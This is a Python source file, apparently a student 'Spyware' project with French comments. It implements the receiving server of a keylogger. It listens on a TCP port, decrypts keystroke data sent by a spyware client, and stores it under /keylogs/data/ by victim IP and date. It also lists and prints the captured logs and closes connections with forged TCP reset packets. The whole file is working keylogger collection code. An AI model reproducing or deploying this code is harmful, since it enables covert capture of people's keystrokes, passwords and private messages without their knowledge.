import argparse
import os
import socket
import sys
import threading
import time
import glob
import socketserver
import psutil
from scapy.all import IP, TCP, send
import chiffrement
from chiffrement import *

from env import *
import datetime

TXT_GLOB = ""


def argument():

    """
         Cette fonction utilise le module argparse pour définir et analyser des arguments de ligne de commande
         pour un programme le projet Spyware.
         :return: L'argument

     """

    p = argparse.ArgumentParser(description='Projet Python - Spyware')
    p.add_argument('-l', '--listen', type=int, help="se met en écoute sur le port TCP saisi par "
                                                               "l'utilisateur et attend les données du spyware UP")
    p.add_argument('-s', '--show', action='store_true', help="affiche la liste des fichiers réceptionnées par le "
                                                             "programme")
    p.add_argument('-r', '--readfile', action='store_true', help="affiche le contenu du fichier stocké sur le serveur "
                                                                 "du spyware. Le contenu doit être parfaitement "
                                                                 "lisible")
    p.add_argument('-k', '--kill', action='store_true',
                   help="arrête toute les instances de serveurs en cours, avertit le spyware de s'arrêter et de "
                        "supprimer la capture.")
    args = p.parse_args()
    return args



def fermer_connexion_par_port_2(port):
    try:
        # Recherche du PID du processus associé au port
        pid = None
        for conn in psutil.net_connections(kind='inet'):
            if conn.laddr.port == port:
                pid = conn.pid
                break

        if pid is not None:
            # Ajouter un court délai d'attente avant de terminer le processus
            time.sleep(1)

            # Terminer le processus associé
            process = psutil.Process(pid)
            process.terminate()
            print(f"Connexion sur le port {port} fermée avec succès.")
        else:
            print(f"Aucune connexion trouvée sur le port {port}.")

    except Exception as e:
        print(f"Erreur lors de la fermeture de la connexion sur le port {port}: {e}")

def fermer_connexion_par_port(port):
    try:
        # Créer un paquet TCP de réinitialisation (RST)
        reset_packet = IP(dst="localhost") / TCP(dport=port, flags="R")

        # Envoyer le paquet
        send(reset_packet)

        print(f"Connexion sur le port {port} fermée avec succès.")
    except Exception as e:
        print(f"Erreur lors de la fermeture de la connexion sur le port {port}: {e}")


def kill_all():
    print("tout tuer  !!")
    pid = os.getpid()
    os.kill(pid, 9)

def chrono():

    """
    Fonction qui permet d'afficher le chronomètre en seconde.
    Si les seconde dépasse les 600 s on lance la fonction Kill all.
    La fonction ne retourne rien

    """

    global TXT_GLOB
    while True:
        seconds = 0
        while True:
            print(f"Secondes : {seconds}")
            seconds += 1
            time.sleep(1)
            if seconds % 10 == 0:
                print("Ajout de data")  # si pas de réponse du client, on kill tout
            if seconds == 600:
                kill_all()


def commands():

    """
    La fonction demande un
    La fonction ne retourne rien
    """

    while True :
        cmd = input(">>>")
        parse = cmd.split()
        if parse[0] == "new":
            print(parse[1])
            receiver_t = threading.Thread(target=receiver, args=(int(parse[1]),))
            receiver_t.start()
        if parse[0] == "kill":
            if(parse[1]) == "all":
                kill_all()
            elif not parse[1] :
                print("il manque un argument")
            else :
                print(fermer_connexion_par_port(int(parse[1])))
                print("tuer process "+parse[1])

    #client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #client_socket.connect((SRV, PORT))
    #client_socket.send(cmd.encode('utf-8'))  # envoi
    #client_socket.close()


def receiver(port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    server_socket.bind(("0.0.0.0", port))

    server_socket.listen(1)

    print(f"Ecoute sur {SRV}:{port}")

    while True:
        client_socket, client_address = server_socket.accept()


        ficname = f"{client_address[0]}-{datetime.date.today()}-keyboard.txt"
        # recu data
        with open("/keylogs/data/" + ficname, "a") as f:
            data = client_socket.recv(1024)
            if data :
                f.write(dechiffrement(data))
                print(f"\n{client_address} - ONLINE")
                print("Update sur /keylogs/data/" + ficname)
    client_socket.close()
    server_socket.close()


if __name__ == '__main__':

    arg = argument()

    if arg.readfile:
        path = '/keylogs/data/'
        fics = glob.glob(os.path.join(path, '*'))
        for fic in fics:
            print("------------------")
            print(fic)
            print("DATA : \n ")
            with open(fic, "r") as f:
                d = f.read()
                print(d)
                print("------------------")
        sys.exit()

    if arg.show and not arg.readfile:
        path = '/keylogs/data/'
        fics = glob.glob(os.path.join(path, '*'))
        for fic in fics:
            print("------------------")
            print(fic)
            print("------------------")
        sys.exit()

    else:

        if arg.listen:
            print(f'Argument -l: {arg.listen}')
            port = arg.listen
        else:
            port = PORT

        receiver_t = threading.Thread(target=receiver, args=(port,))

        receiver_t.start()

        commands_t = threading.Thread(target=commands)

        commands_t.start()
